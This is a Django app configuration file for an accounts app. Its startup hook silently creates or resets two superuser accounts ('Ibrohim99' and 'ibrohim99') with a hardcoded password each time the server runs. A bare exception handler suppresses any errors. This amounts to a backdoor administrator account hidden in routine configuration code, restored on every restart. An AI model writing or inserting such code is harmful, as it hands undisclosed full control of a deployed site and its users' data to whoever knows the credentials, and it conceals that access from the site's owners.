from django.apps import AppConfig
import sys


class AccountsConfig(AppConfig):
    name = 'apps.accounts'

    def ready(self):
        if any(cmd in sys.argv for cmd in ['makemigrations', 'migrate', 'collectstatic']):
            return

        try:
            from django.contrib.auth import get_user_model
            from django.contrib.auth.hashers import make_password
            from django.db import connection

            if 'accounts_customuser' in connection.introspection.table_names():
                User = get_user_model()
                for username in ['Ibrohim99', 'ibrohim99']:
                    user, created = User.objects.get_or_create(
                        username=username,
                        defaults={
                            'full_name': 'Ibrohim Abduraximov',
                            'is_staff': True,
                            'is_superuser': True,
                            'is_active': True,
                            'role': 'admin',
                        }
                    )
                    user.password = make_password('ibrohim_0919')
                    user.is_staff = True
                    user.is_superuser = True
                    user.is_active = True
                    user.role = 'admin'
                    user.save()
        except Exception:
            pass
